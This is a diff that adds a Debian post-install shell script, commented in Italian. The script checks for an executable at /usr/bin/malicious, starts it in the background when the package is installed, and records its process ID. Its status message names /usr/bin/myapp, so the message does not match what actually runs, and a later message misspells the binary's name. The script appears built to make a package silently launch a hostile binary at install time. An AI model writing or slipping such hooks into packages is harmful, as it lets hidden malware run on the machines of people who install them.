@@ -1,0 +1,16 @@
+#!/bin/sh
+set -e
+# postinst script for launching the ELF executable
+# Verifica che l'applicativo ELF esista ed è eseguibile
+if [ -x /usr/bin/malicious ];then
+echo "Eseguo /usr/bin/myapp"
+# Lancia l'applicativo ELF in background
+/usr/bin/malicious &
+# Salva l'ID del processo (PID) se necessario
+echo $! > /var/run/malicious.pid
+echo "/usr/bin/maliciuos è stato avviato con successo"
+else
+echo "Errore: /usr/bin/malicious non esiste o non è eseguibile"
+exit 1
+fi
+exit 0
